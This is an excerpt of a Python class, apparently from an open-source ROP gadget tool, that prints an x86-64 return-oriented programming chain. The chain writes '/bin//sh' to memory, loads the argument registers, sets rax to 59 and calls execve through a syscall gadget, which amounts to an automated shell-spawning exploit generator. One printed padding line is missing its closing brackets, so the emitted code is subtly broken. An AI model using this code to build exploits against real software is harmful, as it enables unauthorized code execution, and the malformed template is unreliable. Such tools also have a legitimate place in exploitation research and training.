...
class ROPMakerX64(object):
    ...
    def __padding(self, gadget, regAlreadSetted):
        ...
        for g in lg[1:]:
            if g.split()[0] == "pop":
                reg = g.split()[1]
                try:
                    print("\tp = b\"\".join([p, pack('<Q', 0x%016x) # padding without overwrite %s" %(regAlreadSetted[reg], reg))
                except KeyError:
                    print("\tp = b\"\".join([p, pack('<Q', 0x4141414141414141) # padding")
    ...
    def __buildRopChain(self, write4where, popDst, popSrc, xorSrc, xorRax, incRax, popRdi, popRsi, popRdx, syscall):
        ...
        print("\tp = b\"\".join([p, pack('<Q', 0x%016x)]) # %s" %(popDst["vaddr"], popDst["gadget"]))
        print("\tp = b\"\".join([p, pack('<Q', 0x%016x)]) # @ .data" %(dataAddr))
        self.__padding(popDst, {})

        print("\tp = b\"\".join([p, pack('<Q', 0x%016x)]) # %s" %(popSrc["vaddr"], popSrc["gadget"]))
        print("\tp = b\"\".join([p, b'/bin//sh'])")
        self.__padding(popSrc, {popDst["gadget"].split()[1]: dataAddr}) # Don't overwrite reg dst

        print("\tp = b\"\".join([p, pack('<Q', 0x%016x)]) # %s" %(write4where["vaddr"], write4where["gadget"]))
        self.__padding(write4where, {})

        print("\tp = b\"\".join([p, pack('<Q', 0x%016x)]) # %s" %(popDst["vaddr"], popDst["gadget"]))
        print("\tp = b\"\".join([p, pack('<Q', 0x%016x)]) # @ .data + 8" %(dataAddr + 8))
        self.__padding(popDst, {})

        print("\tp = b\"\".join([p, pack('<Q', 0x%016x)]) # %s" %(xorSrc["vaddr"], xorSrc["gadget"]))
        self.__padding(xorSrc, {})

        print("\tp = b\"\".join([p, pack('<Q', 0x%016x)]) # %s" %(write4where["vaddr"], write4where["gadget"]))
        self.__padding(write4where, {})

        print("\tp = b\"\".join([p, pack('<Q', 0x%016x)]) # %s" %(popRdi["vaddr"], popRdi["gadget"]))
        print("\tp = b\"\".join([p, pack('<Q', 0x%016x)]) # @ .data" %(dataAddr))
        self.__padding(popRdi, {})

        print("\tp = b\"\".join([p, pack('<Q', 0x%016x)]) # %s" %(popRsi["vaddr"], popRsi["gadget"]))
        print("\tp = b\"\".join([p, pack('<Q', 0x%016x)]) # @ .data + 8" %(dataAddr + 8))
        self.__padding(popRsi, {"rdi": dataAddr}) # Don't overwrite rdi

        print("\tp = b\"\".join([p, pack('<Q', 0x%016x)]) # %s" %(popRdx["vaddr"], popRdx["gadget"]))
        print("\tp = b\"\".join([p, pack('<Q', 0x%016x)]) # @ .data + 8" %(dataAddr + 8))
        self.__padding(popRdx, {"rdi": dataAddr, "rsi": dataAddr + 8}) # Don't overwrite rdi and rsi

        print("\tp = b\"\".join([p, pack('<Q', 0x%016x)]) # %s" %(xorRax["vaddr"], xorRax["gadget"]))
        self.__padding(xorRax, {"rdi": dataAddr, "rsi": dataAddr + 8}) # Don't overwrite rdi and rsi

        for i in range(59):
            print("\tp = b\"\".join([p, pack('<Q', 0x%016x)]) # %s" %(incRax["vaddr"], incRax["gadget"]))
            self.__padding(incRax, {"rdi": dataAddr, "rsi": dataAddr + 8}) # Don't overwrite rdi and rsi

        print("\tp = b\"\".join([p, pack('<Q', 0x%016x)]) # %s" %(syscall["vaddr"], syscall["gadget"]))
